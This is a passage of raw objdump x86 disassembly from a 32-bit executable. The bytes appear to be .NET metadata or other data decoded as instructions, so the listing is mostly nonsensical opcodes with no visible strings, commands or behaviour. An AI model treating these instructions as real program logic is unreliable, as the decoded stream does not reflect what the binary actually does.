  4046bb:	0b 84 01 0a 00 57 05 	or     0x557000a(%ecx,%eax,1),%eax
  4046c2:	1f                   	pop    %ds
  4046c3:	12 06                	adc    (%esi),%al
  4046c5:	00 83 0f 84 01 0a    	add    %al,0xa01840f(%ebx)
  4046cb:	00 75 05             	add    %dh,0x5(%ebp)
  4046ce:	1f                   	pop    %ds
  4046cf:	12 06                	adc    (%esi),%al
  4046d1:	00 8a 18 55 00 1e    	add    %cl,0x1e005518(%edx)
  4046d7:	00 96 13 1b 02 06    	add    %dl,0x6021b13(%esi)
  4046dd:	00 32                	add    %dh,(%edx)
  4046df:	0c 55                	or     $0x55,%al
  4046e1:	00 06                	add    %al,(%esi)
  4046e3:	00 12                	add    %dl,(%edx)
  4046e5:	05 84 01 06 00       	add    $0x60184,%eax
  4046ea:	18 04 84             	sbb    %al,(%esp,%eax,4)
  4046ed:	01 06                	add    %eax,(%esi)
  4046ef:	00 84 11 84 01 06 00 	add    %al,0x60184(%ecx,%edx,1)
  4046f6:	79 0f                	jns    0x404707
  4046f8:	84 01                	test   %al,(%ecx)
  4046fa:	1e                   	push   %ds
  4046fb:	00 92 0f 40 12 06    	add    %dl,0x612400f(%edx)
  404701:	00 18                	add    %bl,(%eax)
  404703:	12 9b 0d 06 00 67    	adc    0x6700060d(%ebx),%bl
  404709:	00 9b 0d 06 00 92    	add    %bl,-0x6dfff9f3(%ebx)
  40470f:	0d 9b 0d 06 00       	or     $0x60d9b,%eax
  404714:	da 0d 35 18 06 00    	fimull 0x61835
  40471a:	07                   	pop    %es
  40471b:	0e                   	push   %cs
  40471c:	9b                   	fwait
  40471d:	0d 22 00 88 0e       	or     $0xe880022,%eax
  404722:	16                   	push   %ss
  404723:	14 06                	adc    $0x6,%al
  404725:	00 c1                	add    %al,%cl
  404727:	18 a3 0c 06 00 bd    	sbb    %ah,-0x42fff9f4(%ebx)
  40472d:	0c a3                	or     $0xa3,%al
  40472f:	0c 06                	or     $0x6,%al
  404731:	00 20                	add    %ah,(%eax)
  404733:	05 a3 0c 06 00       	add    $0x60ca3,%eax
  404738:	a9 02 9b 0d 06       	test   $0x60d9b02,%eax
  40473d:	00 00                	add    %al,(%eax)
  40473f:	05 f1 09 0a 00       	add    $0xa09f1,%eax
  404744:	1d 11 55 00 0a       	sbb    $0xa005511,%eax
  404749:	00 dc                	add    %bl,%ah
  40474b:	14 55                	adc    $0x55,%al
  40474d:	00 06                	add    %al,(%esi)
  40474f:	00 e6                	add    %ah,%dh
  404751:	03 55 00             	add    0x0(%ebp),%edx
  404754:	1a 00                	sbb    (%eax),%al
  404756:	97                   	xchg   %eax,%edi
  404757:	04 04                	add    $0x4,%al
  404759:	10 06                	adc    %al,(%esi)
  40475b:	00 12                	add    %dl,(%edx)
  40475d:	00 00                	add    %al,(%eax)
  40475f:	02 06                	add    (%esi),%al
  404761:	00 2c 0e             	add    %ch,(%esi,%ecx,1)
  404764:	9b                   	fwait
  404765:	0d 0e 00 d0 0f       	or     $0xfd0000e,%eax
  40476a:	c0 0b 06             	rorb   $0x6,(%ebx)
  40476d:	00 d9                	add    %bl,%cl
  40476f:	11 9b 0d 06 00 dc    	adc    %ebx,-0x23fff9f3(%ebx)
  404775:	04 9b                	add    $0x9b,%al
  404777:	0d 26 00 9f 0f       	or     $0xf9f0026,%eax
  40477c:	99                   	cltd
  40477d:	10 26                	adc    %ah,(%esi)
  40477f:	00 64 13 99          	add    %ah,-0x67(%ebx,%edx,1)
  404783:	10 26                	adc    %ah,(%esi)
  404785:	00 c0                	add    %al,%al
  404787:	10 99 10 1a 00 b8    	adc    %bl,-0x47ffe5f0(%ecx)
  40478d:	10 7d 12             	adc    %bh,0x12(%ebp)
  404790:	26 00 7c 13 99       	add    %bh,%es:-0x67(%ebx,%edx,1)
  404795:	10 06                	adc    %al,(%esi)
  404797:	00 46 0f             	add    %al,0xf(%esi)
  40479a:	9b                   	fwait
  40479b:	0d 06 00 27 13       	or     $0x13270006,%eax
  4047a0:	35 18 06 00 30       	xor    $0x30000618,%eax
  4047a5:	0f 9b 0d 06 00 b3 0d 	setnp  0xdb30006
  4047ac:	35 18 06 00 4d       	xor    $0x4d000618,%eax
  4047b1:	04 35                	add    $0x35,%al
  4047b3:	18 06                	sbb    %al,(%esi)
  4047b5:	00 21                	add    %ah,(%ecx)
  4047b7:	04 35                	add    $0x35,%al
  4047b9:	18 06                	sbb    %al,(%esi)
  4047bb:	00 ef                	add    %ch,%bh
  4047bd:	0d 35 18 06 00       	or     $0x61835,%eax
  4047c2:	3c 04                	cmp    $0x4,%al
  4047c4:	35 18 06 00 19       	xor    $0x19000618,%eax
  4047c9:	0f 35                	sysexit
  4047cb:	18 06                	sbb    %al,(%esi)
  4047cd:	00 e1                	add    %ah,%cl
  4047cf:	10 9b 0d 06 00 c8    	adc    %bl,-0x37fff9f3(%ebx)
  4047d5:	17                   	pop    %ss
  4047d6:	9b                   	fwait
  4047d7:	0d 06 00 5c 14       	or     $0x145c0006,%eax
  4047dc:	7d 12                	jge    0x4047f0
  4047de:	06                   	push   %es
  4047df:	00 b9 04 9b 0d 00    	add    %bh,0xd9b04(%ecx)
  4047e5:	00 00                	add    %al,(%eax)
  4047e7:	00 bd 00 00 00 00    	add    %bh,0x0(%ebp)
  4047ed:	00 01                	add    %al,(%ecx)
  4047ef:	00 01                	add    %al,(%ecx)
  4047f1:	00 01                	add    %al,(%ecx)
  4047f3:	00 10                	add    %dl,(%eax)
  4047f5:	00 76 0d             	add    %dh,0xd(%esi)
  4047f8:	58                   	pop    %eax
  4047f9:	16                   	push   %ss
  4047fa:	3d 00 01 00 01       	cmp    $0x1000100,%eax
  4047ff:	00 81 01 10 00 a8    	add    %al,-0x57ffefff(%ecx)
  404805:	13 58 16             	adc    0x16(%eax),%ebx
  404808:	3d 00 01 00 03       	cmp    $0x3000100,%eax
  40480d:	00 81 01 10 00 9e    	add    %al,-0x61ffefff(%ecx)
  404813:	15 fa 0e 3d 00       	adc    $0x3d0efa,%eax
  404818:	13 00                	adc    (%eax),%eax
  40481a:	06                   	push   %es
  40481b:	00 00                	add    %al,(%eax)
  40481d:	00 10                	add    %dl,(%eax)
  40481f:	00 f6                	add    %dh,%dh
  404821:	0f f1 0c 3d 00 1f 00 	psllw  0x25001f00(,%edi,1),%mm1
  404828:	25 
  404829:	00 00                	add    %al,(%eax)
  40482b:	00 10                	add    %dl,(%eax)
  40482d:	00 c8                	add    %cl,%al
  40482f:	13 42 11             	adc    0x11(%edx),%eax
  404832:	3d 00 1f 00 27       	cmp    $0x27001f00,%eax
  404837:	00 81 01 10 00 0f    	add    %al,0xf001001(%ecx)
  40483d:	0e                   	push   %cs
  40483e:	42                   	inc    %edx
  40483f:	11 3d 00 1f 00 2e    	adc    %edi,0x2e001f00
  404845:	00 81 01 10 00 89    	add    %al,-0x76ffefff(%ecx)
  40484b:	10 42 11             	adc    %al,0x11(%edx)
  40484e:	3d 00 1f 00 30       	cmp    $0x30001f00,%eax
  404853:	00 81 01 10 00 38    	add    %al,0x38001001(%ecx)
  404859:	12 42 11             	adc    0x11(%edx),%al
  40485c:	3d 00 1f 00 31       	cmp    $0x31001f00,%eax
  404861:	00 81 01 10 00 2c    	add    %al,0x2c001001(%ecx)
  404867:	0d 42 11 3d 00       	or     $0x3d1142,%eax
  40486c:	1f                   	pop    %ds
  40486d:	00 37                	add    %dh,(%edi)
  40486f:	00 81 01 10 00 32    	add    %al,0x32001001(%ecx)
  404875:	12 42 11             	adc    0x11(%edx),%al
  404878:	3d 00 20 00 39       	cmp    $0x39002000,%eax
  40487d:	00 81 01 10 00 81    	add    %al,-0x7effefff(%ecx)
  404883:	0c 42                	or     $0x42,%al
  404885:	11 3d 00 20 00 3f    	adc    %edi,0x3f002000
  40488b:	00 81 01 10 00 87    	add    %al,-0x78ffefff(%ecx)
  404891:	18 42 11             	sbb    %al,0x11(%edx)
  404894:	3d 00 20 00 42       	cmp    $0x42002000,%eax
  404899:	00 81 01 10 00 97    	add    %al,-0x68ffefff(%ecx)
  40489f:	15 79 15 3d 00       	adc    $0x3d1579,%eax
  4048a4:	21 00                	and    %eax,(%eax)
  4048a6:	47                   	inc    %edi
  4048a7:	00 01                	add    %al,(%ecx)
  4048a9:	00 10                	add    %dl,(%eax)
  4048ab:	00 a6 00 a2 0d 3d    	add    %ah,0x3d0da200(%esi)
  4048b1:	00 22                	add    %ah,(%edx)
  4048b3:	00 4c 00 81          	add    %cl,-0x7f(%eax,%eax,1)
  4048b7:	01 10                	add    %edx,(%eax)
  4048b9:	00 9f 00 a2 0d 3d    	add    %bl,0x3d0da200(%edi)
  4048bf:	00 29                	add    %ch,(%ecx)
  4048c1:	00 53 00             	add    %dl,0x0(%ebx)
  4048c4:	00 01                	add    %al,(%ecx)
  4048c6:	00 00                	add    %al,(%eax)
  4048c8:	c6 00 00             	movb   $0x0,(%eax)
  4048cb:	00 3d 00 29 00 55    	add    %bh,0x55002900
  4048d1:	00 02                	add    %al,(%edx)
  4048d3:	01 00                	add    %eax,(%eax)
  4048d5:	00 6a 01             	add    %ch,0x1(%edx)
  4048d8:	00 00                	add    %al,(%eax)
  4048da:	d1 00                	roll   $1,(%eax)
  4048dc:	2a 00                	sub    (%eax),%al
  4048de:	55                   	push   %ebp
  4048df:	00 83 01 10 00 6d    	add    %al,0x6d001001(%ebx)
  4048e5:	00 00                	add    %al,(%eax)
  4048e7:	00 3d 00 2e 00 55    	add    %bh,0x55002e00
  4048ed:	00 15 01 00 00 38    	add    %dl,0x38000001
  4048f3:	00 00                	add    %al,(%eax)
  4048f5:	00 05 01 2f 00 55    	add    %al,0x55002f01
  4048fb:	00 16                	add    %dl,(%esi)
  4048fd:	00 e9                	add    %ch,%cl
  4048ff:	14 90                	adc    $0x90,%al
  404901:	05 16 00 f6 14       	add    $0x14f60016,%eax
  404906:	90                   	nop
  404907:	05 16 00 80 0e       	add    $0xe800016,%eax
  40490c:	90                   	nop
  40490d:	05 16 00 f8 0c       	add    $0xcf80016,%eax
  404912:	90                   	nop
  404913:	05 16 00 7b 10       	add    $0x107b0016,%eax
  404918:	90                   	nop
  404919:	05 16 00 0b 05       	add    $0x50b0016,%eax
  40491e:	90                   	nop
  40491f:	05 16 00 2c 18       	add    $0x182c0016,%eax
  404924:	90                   	nop
  404925:	05 16 00 c7 01       	add    $0x1c70016,%eax
  40492a:	90                   	nop
  40492b:	05 16 00 fc 06       	add    $0x6fc0016,%eax
  404930:	90                   	nop
  404931:	05 16 00 b5 06       	add    $0x6b50016,%eax
  404936:	90                   	nop
  404937:	05 16 00 f6 06       	add    $0x6f60016,%eax
  40493c:	93                   	xchg   %eax,%ebx
  40493d:	05 16 00 b7 0b       	add    $0xbb70016,%eax
  404942:	90                   	nop
  404943:	05 16 00 ad 00       	add    $0xad0016,%eax
  404948:	97                   	xchg   %eax,%edi
  404949:	05 16 00 48 0e       	add    $0xe480016,%eax
  40494e:	90                   	nop
  40494f:	05 16 00 9b 01       	add    $0x19b0016,%eax
  404954:	90                   	nop
  404955:	05 16 00 ae 02       	add    $0x2ae0016,%eax
  40495a:	90                   	nop
  40495b:	05 16 00 b0 17       	add    $0x17b00016,%eax
  404960:	90                   	nop
  404961:	05 16 00 f0 0f       	add    $0xff00016,%eax
  404966:	90                   	nop
  404967:	05 11 00 ba 03       	add    $0x3ba0011,%eax
  40496c:	9b                   	fwait
  40496d:	05 11 00 9f 03       	add    $0x39f0011,%eax
  404972:	9f                   	lahf
  404973:	05 11 00 6f 03       	add    $0x36f0011,%eax
  404978:	a3 05 11 00 05       	mov    %eax,0x5001105
  40497d:	03 a7 05 11 00 87    	add    -0x78ffeefb(%edi),%esp
  404983:	03 a7 05 11 00 ea    	add    -0x15ffeefb(%edi),%esp
  404989:	02 aa 05 11 00 cd    	add    -0x32ffeefb(%edx),%ch
  40498f:	02 ae 05 31 00 b3    	add    -0x4cffcefb(%esi),%ch
  404995:	02 b1 05 11 00 21    	add    0x21001105(%ecx),%dh
  40499b:	03 aa 05 11 00 55    	add    0x55001105(%edx),%ebp
  4049a1:	03 4f 03             	add    0x3(%edi),%ecx
  4049a4:	11 00                	adc    %eax,(%eax)
  4049a6:	37                   	aaa
  4049a7:	03 ae 05 11 00 37    	add    0x37001105(%esi),%ebp
  4049ad:	11 aa 05 16 00 d4    	adc    %ebp,-0x2bffe9fb(%edx)
  4049b3:	0f b4 05 31 00 67 01 	lfs    0x1670031,%eax
  4049ba:	90                   	nop
  4049bb:	05 16 00 e6 13       	add    $0x13e60016,%eax
  4049c0:	b9 05 51 80 a9       	mov    $0xa9805105,%ecx
  4049c5:	0b 4f 03             	or     0x3(%edi),%ecx
  4049c8:	51                   	push   %ecx
  4049c9:	80 a5 0b 4f 03 51 80 	andb   $0x80,0x51034f0b(%ebp)
  4049d0:	9c                   	pushf
  4049d1:	0b 4f 03             	or     0x3(%edi),%ecx
  4049d4:	51                   	push   %ecx
  4049d5:	80 80 0b 4f 03 21 00 	addb   $0x0,0x21034f0b(%eax)
  4049dc:	30 18                	xor    %bl,(%eax)
  4049de:	a3 05 21 00 11       	mov    %eax,0x11002105
  4049e3:	18 a3 05 31 00 d4    	sbb    %ah,-0x2bffcefb(%ebx)
  4049e9:	15 a3 05 33 01       	adc    $0x13305a3,%eax
  4049ee:	e5 00                	in     $0x0,%eax
  4049f0:	c3                   	ret
  4049f1:	05 06 06 cb 01       	add    $0x1cb0606,%eax
  4049f6:	c7 05 56 80 a0 01 ca 	movl   $0x805605ca,0x1a08056
  4049fd:	05 56 80 
  404a00:	3c 01                	cmp    $0x1,%al
  404a02:	ca 05 56             	lret   $0x5605
  404a05:	80 29 01             	subb   $0x1,(%ecx)
  404a08:	ca 05 16             	lret   $0x1605
  404a0b:	00 0b                	add    %cl,(%ebx)
  404a0d:	00 ce                	add    %cl,%dh
  404a0f:	05 50 20 00 00       	add    $0x2050,%eax
  404a14:	00 00                	add    %al,(%eax)
  404a16:	96                   	xchg   %eax,%esi
  404a17:	00 17                	add    %dl,(%edi)
  404a19:	0e                   	push   %cs
  404a1a:	c3                   	ret
  404a1b:	01 01                	add    %eax,(%ecx)
  404a1d:	00 5c 21 00          	add    %bl,0x0(%ecx,%eiz,1)
  404a21:	00 00                	add    %al,(%eax)
  404a23:	00 86 18 e3 11 06    	add    %al,0x611e318(%esi)
  404a29:	00 01                	add    %al,(%ecx)
  404a2b:	00 68 21             	add    %ch,0x21(%eax)
  404a2e:	00 00                	add    %al,(%eax)
  404a30:	00 00                	add    %al,(%eax)
  404a32:	96                   	xchg   %eax,%esi
  404a33:	00 9e 13 d0 02 01    	add    %bl,0x102d013(%esi)
  404a39:	00 7c 21 00          	add    %bh,0x0(%ecx,%eiz,1)
  404a3d:	00 00                	add    %al,(%eax)
  404a3f:	00 91 00 50 0b d0    	add    %dl,-0x2ff4b000(%ecx)
  404a45:	02 01                	add    (%ecx),%al
  404a47:	00 e8                	add    %ch,%al
  404a49:	21 00                	and    %eax,(%eax)
  404a4b:	00 00                	add    %al,(%eax)
  404a4d:	00 91 18 e9 11 c3    	add    %dl,-0x3cee16e8(%ecx)
  404a53:	01 01                	add    %eax,(%ecx)
  404a55:	00 a4 22 00 00 00 00 	add    %ah,0x0(%edx,%eiz,1)
  404a5c:	96                   	xchg   %eax,%esi
  404a5d:	08 2e                	or     %ch,(%esi)
  404a5f:	16                   	push   %ss
  404a60:	eb 05                	jmp    0x404a67
  404a62:	01 00                	add    %eax,(%eax)
  404a64:	ab                   	stos   %eax,%es:(%edi)
  404a65:	22 00                	and    (%eax),%al
  404a67:	00 00                	add    %al,(%eax)
  404a69:	00 96 08 3c 16 f0    	add    %dl,-0xfe9c3f8(%esi)
  404a6f:	05 01 00 b3 22       	add    $0x22b30001,%eax
  404a74:	00 00                	add    %al,(%eax)
  404a76:	00 00                	add    %al,(%eax)
  404a78:	96                   	xchg   %eax,%esi
  404a79:	08 12                	or     %dl,(%edx)
  404a7b:	16                   	push   %ss
  404a7c:	f6 05 02 00 ba 22 00 	testb  $0x0,0x22ba0002
  404a83:	00 00                	add    %al,(%eax)
  404a85:	00 96 08 20 16 fb    	add    %dl,-0x4e9dff8(%esi)
  404a8b:	05 02 00 c2 22       	add    $0x22c20002,%eax
  404a90:	00 00                	add    %al,(%eax)
  404a92:	00 00                	add    %al,(%eax)
  404a94:	91                   	xchg   %eax,%ecx
  404a95:	08 d2                	or     %dl,%dl
  404a97:	10 01                	adc    %al,(%ecx)
  404a99:	06                   	push   %es
  404a9a:	03 00                	add    (%eax),%eax
  404a9c:	c9                   	leave
  404a9d:	22 00                	and    (%eax),%al
  404a9f:	00 00                	add    %al,(%eax)
  404aa1:	00 91 08 dd 10 06    	add    %dl,0x610dd08(%ecx)
  404aa7:	06                   	push   %es
  404aa8:	03 00                	add    (%eax),%eax
  404aaa:	d1 22                	shll   $1,(%edx)
  404aac:	00 00                	add    %al,(%eax)
  404aae:	00 00                	add    %al,(%eax)
  404ab0:	91                   	xchg   %eax,%ecx
  404ab1:	08 75 09             	or     %dh,0x9(%ebp)
  404ab4:	0c 06                	or     $0x6,%al
  404ab6:	04 00                	add    $0x0,%al
  404ab8:	d8 22                	fsubs  (%edx)
  404aba:	00 00                	add    %al,(%eax)
  404abc:	00 00                	add    %al,(%eax)
  404abe:	91                   	xchg   %eax,%ecx
  404abf:	08 84 09 10 06 04 00 	or     %al,0x40610(%ecx,%ecx,1)
  404ac6:	e0 22                	loopne 0x404aea
  404ac8:	00 00                	add    %al,(%eax)
  404aca:	00 00                	add    %al,(%eax)
  404acc:	91                   	xchg   %eax,%ecx
  404acd:	08 ab 15 0c 06 05    	or     %ch,0x5060c15(%ebx)
  404ad3:	00 e7                	add    %ah,%bh
  404ad5:	22 00                	and    (%eax),%al
  404ad7:	00 00                	add    %al,(%eax)
  404ad9:	00 91 08 b6 15 10    	add    %dl,0x1015b608(%ecx)
  404adf:	06                   	push   %es
  404ae0:	05 00 ef 22 00       	add    $0x22ef00,%eax
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	00 91 08 2a 09 15    	add    %dl,0x15092a08(%ecx)
  404aed:	06                   	push   %es
  404aee:	06                   	push   %es
  404aef:	00 f6                	add    %dh,%dh
  404af1:	22 00                	and    (%eax),%al
  404af3:	00 00                	add    %al,(%eax)
  404af5:	00 91 08 38 09 1a    	add    %dl,0x1a093808(%ecx)
  404afb:	06                   	push   %es
  404afc:	06                   	push   %es
  404afd:	00 fe                	add    %bh,%dh
  404aff:	22 00                	and    (%eax),%al
  404b01:	00 00                	add    %al,(%eax)
  404b03:	00 96 08 7c 02 d0    	add    %dl,-0x2ffd83f8(%esi)
  404b09:	02 07                	add    (%edi),%al
  404b0b:	00 05 23 00 00 00    	add    %al,0x23
  404b11:	00 96 08 8c 02 20    	add    %dl,0x20028c08(%esi)
  404b17:	06                   	push   %es
  404b18:	07                   	pop    %es
  404b19:	00 0d 23 00 00 00    	add    %cl,0x23
  404b1f:	00 91 08 31 02 25    	add    %dl,0x25023108(%ecx)
  404b25:	06                   	push   %es
  404b26:	08 00                	or     %al,(%eax)
  404b28:	14 23                	adc    $0x23,%al
  404b2a:	00 00                	add    %al,(%eax)
  404b2c:	00 00                	add    %al,(%eax)
  404b2e:	91                   	xchg   %eax,%ecx
  404b2f:	08 d5                	or     %dl,%ch
  404b31:	09 15 06 08 00 1b    	or     %edx,0x1b000806
  404b37:	23 00                	and    (%eax),%eax
  404b39:	00 00                	add    %al,(%eax)
  404b3b:	00 91 08 de 09 1a    	add    %dl,0x1a09de08(%ecx)
  404b41:	06                   	push   %es
  404b42:	08 00                	or     %al,(%eax)
  404b44:	23 23                	and    (%ebx),%esp
  404b46:	00 00                	add    %al,(%eax)
  404b48:	00 00                	add    %al,(%eax)
  404b4a:	96                   	xchg   %eax,%esi
  404b4b:	08 d7                	or     %dl,%bh
  404b4d:	0c 8a                	or     $0x8a,%al
  404b4f:	02 09                	add    (%ecx),%cl
  404b51:	00 2a                	add    %ch,(%edx)
  404b53:	23 00                	and    (%eax),%eax
  404b55:	00 00                	add    %al,(%eax)
  404b57:	00 96 08 e4 0c 2c    	add    %dl,0x2c0ce408(%esi)
  404b5d:	00 09                	add    %cl,(%ecx)
  404b5f:	00 32                	add    %dh,(%edx)
  404b61:	23 00                	and    (%eax),%eax
  404b63:	00 00                	add    %al,(%eax)
  404b65:	00 96 08 f6 0a d0    	add    %dl,-0x2ff509f8(%esi)
  404b6b:	02 0a                	add    (%edx),%cl
  404b6d:	00 39                	add    %bh,(%ecx)
  404b6f:	23 00                	and    (%eax),%eax
  404b71:	00 00                	add    %al,(%eax)
  404b73:	00 96 08 07 0b 20    	add    %dl,0x200b0708(%esi)
  404b79:	06                   	push   %es
  404b7a:	0a 00                	or     (%eax),%al
  404b7c:	44                   	inc    %esp
  404b7d:	23 00                	and    (%eax),%eax
  404b7f:	00 00                	add    %al,(%eax)
  404b81:	00 96 00 01 16 c3    	add    %dl,-0x3ce9ff00(%esi)
  404b87:	01 0b                	add    %ecx,(%ebx)
  404b89:	00 e4                	add    %ah,%ah
  404b8b:	26 00 00             	add    %al,%es:(%eax)
  404b8e:	00 00                	add    %al,(%eax)
  404b90:	91                   	xchg   %eax,%ecx
  404b91:	00 e7                	add    %ah,%bh
  404b93:	09 a5 01 0b 00 04    	or     %esp,0x4000b01(%ebp)
  404b99:	27                   	daa
  404b9a:	00 00                	add    %al,(%eax)
  404b9c:	00 00                	add    %al,(%eax)
  404b9e:	91                   	xchg   %eax,%ecx
  404b9f:	00 00                	add    %al,(%eax)
  404ba1:	06                   	push   %es
  404ba2:	36 00 0c 00          	add    %cl,%ss:(%eax,%eax,1)
  404ba6:	20 27                	and    %ah,(%edi)
  404ba8:	00 00                	add    %al,(%eax)
  404baa:	00 00                	add    %al,(%eax)
  404bac:	91                   	xchg   %eax,%ecx
  404bad:	00 ee                	add    %ch,%dh
  404baf:	06                   	push   %es
  404bb0:	29 06                	sub    %eax,(%esi)
  404bb2:	0d 00 34 27 00       	or     $0x273400,%eax
  404bb7:	00 00                	add    %al,(%eax)
  404bb9:	00 96 00 55 15 c3    	add    %dl,-0x3ceaab00(%esi)
  404bbf:	01 11                	add    %edx,(%ecx)
  404bc1:	00 a8 27 00 00 00    	add    %ch,0x27(%eax)
  404bc7:	00 96 00 d3 01 34    	add    %dl,0x3401d300(%esi)
  404bcd:	06                   	push   %es
  404bce:	11 00                	adc    %eax,(%eax)
  404bd0:	f0 29 00             	lock sub %eax,(%eax)
  404bd3:	00 00                	add    %al,(%eax)
  404bd5:	00 96 00 da 03 06    	add    %dl,0x603da00(%esi)
  404bdb:	06                   	push   %es
  404bdc:	12 00                	adc    (%eax),%al
  404bde:	78 2b                	js     0x404c0b
  404be0:	00 00                	add    %al,(%eax)
  404be2:	00 00                	add    %al,(%eax)
  404be4:	96                   	xchg   %eax,%esi
  404be5:	00 8e 15 a5 01 13    	add    %cl,0x1301a515(%esi)
  404beb:	00 0c 2c             	add    %cl,(%esp,%ebp,1)
  404bee:	00 00                	add    %al,(%eax)
  404bf0:	00 00                	add    %al,(%eax)
  404bf2:	91                   	xchg   %eax,%ecx
  404bf3:	00 13                	add    %dl,(%ebx)
  404bf5:	0b a5 01 14 00 58    	or     0x58001401(%ebp),%esp
  404bfb:	2c 00                	sub    $0x0,%al
  404bfd:	00 00                	add    %al,(%eax)
  404bff:	00 91 18 e9 11 c3    	add    %dl,-0x3cee16e8(%ecx)
  404c05:	01 15 00 64 2c 00    	add    %edx,0x2c6400
  404c0b:	00 00                	add    %al,(%eax)
  404c0d:	00 96 00 f8 0c c3    	add    %dl,-0x3cf30800(%esi)
  404c13:	01 15 00 80 2f 00    	add    %edx,0x2f8000
  404c19:	00 00                	add    %al,(%eax)
  404c1b:	00 86 18 e3 11 06    	add    %al,0x611e318(%esi)
  404c21:	00 15 00 8c 2f 00    	add    %dl,0x2f8c00
  404c27:	00 00                	add    %al,(%eax)
  404c29:	00 96 00 d6 13 c3    	add    %dl,-0x3cec2a00(%esi)
  404c2f:	01 15 00 cc 2f 00    	add    %edx,0x2fcc00
  404c35:	00 00                	add    %al,(%eax)
  404c37:	00 91 00 5d 0c d0    	add    %dl,-0x2ff3a300(%ecx)
  404c3d:	02 15 00 24 30 00    	add    0x302400,%dl
  404c43:	00 00                	add    %al,(%eax)
  404c45:	00 91 00 96 01 d0    	add    %dl,-0x2ffe6a00(%ecx)
  404c4b:	02 15 00 74 30 00    	add    0x307400,%dl
  404c51:	00 00                	add    %al,(%eax)
  404c53:	00 91 00 58 11 d0    	add    %dl,-0x2feea800(%ecx)
  404c59:	02 15 00 a4 31 00    	add    0x31a400,%dl
  404c5f:	00 00                	add    %al,(%eax)
  404c61:	00 91 00 f5 10 d0    	add    %dl,-0x2fef0b00(%ecx)
  404c67:	02 15 00 e4 31 00    	add    0x31e400,%dl
  404c6d:	00 00                	add    %al,(%eax)
  404c6f:	00 91 00 80 04 d0    	add    %dl,-0x2ffb8000(%ecx)
  404c75:	02 15 00 2c 32 00    	add    0x322c00,%dl
  404c7b:	00 00                	add    %al,(%eax)
  404c7d:	00 86 18 e3 11 06    	add    %al,0x611e318(%esi)
  404c83:	00 15 00 38 32 00    	add    %dl,0x323800
  404c89:	00 00                	add    %al,(%eax)
  404c8b:	00 96 00 ae 02 37    	add    %dl,0x3702ae00(%esi)
  404c91:	02 15 00 b8 32 00    	add    0x32b800,%dl
  404c97:	00 00                	add    %al,(%eax)
  404c99:	00 96 00 48 0b 5d    	add    %dl,0x5d0b4800(%esi)
  404c9f:	00 15 00 30 33 00    	add    %dl,0x333000
  404ca5:	00 00                	add    %al,(%eax)
  404ca7:	00 96 00 67 0f 01    	add    %dl,0x10f6700(%esi)
  404cad:	06                   	push   %es
  404cae:	16                   	push   %ss
  404caf:	00 00                	add    %al,(%eax)
  404cb1:	35 00 00 00 00       	xor    $0x0,%eax
  404cb6:	96                   	xchg   %eax,%esi
  404cb7:	00 51 0e             	add    %dl,0xe(%ecx)
  404cba:	d0 02                	rolb   $1,(%edx)
  404cbc:	16                   	push   %ss
  404cbd:	00 28                	add    %ch,(%eax)
  404cbf:	35 00 00 00 00       	xor    $0x0,%eax
  404cc4:	96                   	xchg   %eax,%esi
  404cc5:	00 c7                	add    %al,%bh
  404cc7:	15 c3 01 16 00       	adc    $0x1601c3,%eax
  404ccc:	98                   	cwtl
  404ccd:	35 00 00 00 00       	xor    $0x0,%eax
  404cd2:	96                   	xchg   %eax,%esi
  404cd3:	00 fc                	add    %bh,%ah
  404cd5:	14 37                	adc    $0x37,%al
  404cd7:	02 16                	add    (%esi),%dl
  404cd9:	00 80 36 00 00 00    	add    %al,0x36(%eax)
  404cdf:	00 96 00 c7 10 3a    	add    %dl,0x3a10c700(%esi)
  404ce5:	06                   	push   %es
  404ce6:	16                   	push   %ss
  404ce7:	00 d0                	add    %dl,%al
  404ce9:	36 00 00             	add    %al,%ss:(%eax)
  404cec:	00 00                	add    %al,(%eax)
  404cee:	96                   	xchg   %eax,%esi
  404cef:	00 c3                	add    %al,%bl
  404cf1:	0f c3 01             	movnti %eax,(%ecx)
  404cf4:	17                   	pop    %ss
  404cf5:	00 04 37             	add    %al,(%edi,%esi,1)
  404cf8:	00 00                	add    %al,(%eax)
  404cfa:	00 00                	add    %al,(%eax)
  404cfc:	96                   	xchg   %eax,%esi
  404cfd:	00 33                	add    %dh,(%ebx)
  404cff:	05 37 02 17 00       	add    $0x170237,%eax
  404d04:	64 37                	fs aaa
  404d06:	00 00                	add    %al,(%eax)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	96                   	xchg   %eax,%esi
  404d0b:	00 a4 17 d0 02 17 00 	add    %ah,0x1702d0(%edi,%edx,1)
  404d12:	8c 37                	mov    %?,(%edi)
  404d14:	00 00                	add    %al,(%eax)
  404d16:	00 00                	add    %al,(%eax)
  404d18:	96                   	xchg   %eax,%esi
  404d19:	00 99 17 c3 01 17    	add    %bl,0x1701c317(%ecx)
  404d1f:	00 00                	add    %al,(%eax)
  404d21:	00 00                	add    %al,(%eax)
  404d23:	00 80 00 96 20 72    	add    %al,0x72209600(%eax)
  404d29:	17                   	pop    %ss
  404d2a:	43                   	inc    %ebx
  404d2b:	06                   	push   %es
  404d2c:	17                   	pop    %ss
  404d2d:	00 00                	add    %al,(%eax)
  404d2f:	00 00                	add    %al,(%eax)
  404d31:	00 80 00 96 20 5f    	add    %al,0x5f209600(%eax)
  404d37:	17                   	pop    %ss
  404d38:	47                   	inc    %edi
  404d39:	06                   	push   %es
  404d3a:	17                   	pop    %ss
  404d3b:	00 00                	add    %al,(%eax)
  404d3d:	00 00                	add    %al,(%eax)
  404d3f:	00 80 00 96 20 cc    	add    %al,-0x33df6a00(%eax)
  404d45:	04 50                	add    $0x50,%al
  404d47:	06                   	push   %es
  404d48:	1a 00                	sbb    (%eax),%al
  404d4a:	00 00                	add    %al,(%eax)
  404d4c:	00 00                	add    %al,(%eax)
  404d4e:	80 00 96             	addb   $0x96,(%eax)
  404d51:	20 94 16 55 06 1b 00 	and    %dl,0x1b0655(%esi,%edx,1)
  404d58:	00 00                	add    %al,(%eax)
  404d5a:	00 00                	add    %al,(%eax)
  404d5c:	80 00 96             	addb   $0x96,(%eax)
  404d5f:	20 32                	and    %dh,(%edx)
  404d61:	07                   	pop    %es
  404d62:	5c                   	pop    %esp
  404d63:	06                   	push   %es
  404d64:	1d 00 00 00 00       	sbb    $0x0,%eax
  404d69:	00 80 00 96 20 69    	add    %al,0x69209600(%eax)
  404d6f:	0c 63                	or     $0x63,%al
  404d71:	06                   	push   %es
  404d72:	1e                   	push   %ds
  404d73:	00 bc 37 00 00 00 00 	add    %bh,0x0(%edi,%esi,1)
